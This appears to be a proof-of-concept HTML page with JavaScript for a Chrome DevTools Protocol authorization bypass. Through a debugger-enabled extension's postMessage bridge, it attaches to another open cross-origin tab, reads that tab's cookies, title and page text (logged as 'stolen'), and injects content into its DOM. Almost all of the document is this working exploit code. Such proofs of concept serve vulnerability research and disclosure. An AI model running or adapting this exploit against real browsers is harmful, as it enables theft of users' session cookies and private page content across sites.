<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>CDP Bypass PoC</title>
<style>
body { font:13px/1.6 monospace;background:#111;color:#999;padding:20px }
.g{color:#5a5}.r{color:#a55}.w{color:#ddd}.d{color:#555}
.card{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:14px;margin:10px 0}
.data{border-left:2px solid #a80;padding:6px 14px;margin:4px 0 4px 12px;color:#ca5;background:#1a1400;white-space:pre-wrap;word-break:break-all}
button{padding:10px 18px;margin:4px;border:1px solid #444;background:#222;color:#ddd;border-radius:6px;cursor:pointer}
button:hover{background:#333}
button.green{border-color:#5a5;color:#5a5}
</style></head><body>

<h2 style="color:#fff">CDP Authorization Bypass</h2>
<p style="color:#888;font-size:12px">
  Extension CDP Proxy Bridge — bypasses <code>Target.exposeDevToolsProtocol</code> fix<br>
  <span class="d">Extension with debugger permission relays CDP to page via postMessage bridge</span>
</p>

<div class="card">
  <b>Status:</b> <span id="status" class="r">Waiting for CDP bridge...</span>
</div>

<button class="green" onclick="attach()">1. Attach CDP Bridge</button>
<button onclick="getTargets()">2. Get All Targets</button>
<button onclick="attack()" id="btnAttack" style="display:none">3. Attack Cross-Origin Tab</button>

<div id="out"></div>

<script>
(function() {
  var out = document.getElementById('out'), status = document.getElementById('status');
  var here = location.href, session, victimUrl;

  function log(s, c) {
    var e = document.createElement('div');
    if (c) e.className = c; e.textContent = s; out.appendChild(e);
  }
  function data(s) {
    var e = document.createElement('pre');
    e.className = 'data'; e.textContent = s; out.appendChild(e);
  }

  // Poll for window.cdp bridge (injected by content script)
  function waitForCDP() {
    if (window.cdp) {
      status.textContent = 'CDP Bridge DETECTED';
      status.className = 'g';
      document.getElementById('btnAttack').style.display = 'inline-block';
      log('window.cdp bridge found - CDP access available', 'g');
      window.cdp.onmessage = function(raw) {
        var m = JSON.parse(raw);
        if (m.method === 'Target.receivedMessageFromTarget') {
          try { onVictim(JSON.parse(m.params.message)); } catch(e) {}
          return;
        }
        if (m.id === 1 && m.result) onTargets(m.result.targetInfos || []);
        if (m.id === 2 && m.result) onAttach(m.result);
        if (m.id <= 2 && m.error) log('error: ' + m.error.message, 'r');
        // Handle CDP events from background
        if (m.method && !m.id) {
          log('  event: ' + m.method, 'd');
        }
      };
      return;
    }
    setTimeout(waitForCDP, 300);
  }
  waitForCDP();

  // Listen for CDP events from content script
  window.addEventListener('message', function(e) {
    if (e.data && e.data.__cdp && e.data.__dir === 'response' && window.cdp && window.cdp.onmessage) {
      window.cdp.onmessage(e.data.__data);
    }
  });

  // ====== CDP Operations ======

  window.attach = function() {
    log('Requesting CDP bridge attachment...', 'w');
    window.postMessage({ __cdp: true, __dir: 'send', __id: 0, __data: JSON.stringify({id:0,method:'Browser.getVersion',params:{}}) }, '*');
    log('Bridge active - click extension icon first to grant debugger attach', 'd');
  };

  window.getTargets = function() {
    if (!window.cdp) return log('No CDP bridge. Click extension icon first.', 'r');
    log('Target.getTargets', 'w');
    window.cdp.send(JSON.stringify({ id: 1, method: 'Target.getTargets', params: {} }));
  };

  function onTargets(list) {
    list.forEach(function(t) { log('  ' + t.type + '  ' + t.url, 'd'); });
    log('');
    var v = list.find(function(t) {
      return t.type === 'page' && t.url !== here && !/^(devtools|chrome|about):/.test(t.url);
    });
    if (!v) return log('no cross-origin tab found. open another tab.', 'r');
    victimUrl = v.url;
    log('Target.attachToTarget  ' + v.url, 'w');
    window.cdp.send(JSON.stringify({ id: 2, method: 'Target.attachToTarget',
      params: { targetId: v.targetId, flatten: false } }));
  }

  function onAttach(res) {
    if (!res.sessionId) return log('attach failed', 'r');
    session = res.sessionId;
    log('  session ' + session.substring(0, 20) + '...', 'g');
    log('');
    log('Runtime.evaluate in victim (read cookies + DOM)', 'w');
    evalVictim(101, 'JSON.stringify({u:location.href,t:document.title,c:document.cookie,b:document.body.innerText.substring(0,500)})');
  }

  function onVictim(m) {
    if (m.id === 101 && m.result && m.result.result) {
      try {
        var d = JSON.parse(m.result.result.value);
        log('  stolen from ' + d.u, 'g');
        data('title:   ' + d.t + '\ncookie:  ' + (d.c || '(none)') + '\ncontent: ' + d.b.substring(0, 300));
      } catch(e) { log('  raw: ' + m.result.result.value, 'g'); }
      log('');
      log('Runtime.evaluate in victim (inject DOM)', 'w');
      evalVictim(102, 'var b=document.createElement("div");b.setAttribute("style","position:fixed;top:0;left:0;right:0;z-index:2147483647;padding:14px 20px;background:#b00;color:#fff;font:bold 14px/1 monospace;text-align:center");b.textContent="Cross-origin injection via CDP proxy bypass";document.documentElement.prepend(b);"done"');
    }
    if (m.id === 102 && m.result) {
      log('  victim DOM modified', 'g');
      log('done. switch to victim tab to see injected banner.', 'w');
    }
    if (m.error) log('  victim error: ' + m.error.message, 'r');
  }

  function evalVictim(id, expr) {
    window.cdp.send(JSON.stringify({ id: ++id, method: 'Target.sendMessageToTarget',
      params: { sessionId: session, message: JSON.stringify({
        id: id, method: 'Runtime.evaluate', params: { expression: expr }
      }) } }));
  }

  window.attack = function() {
    getTargets();
  };
})();
</script>
</body></html>
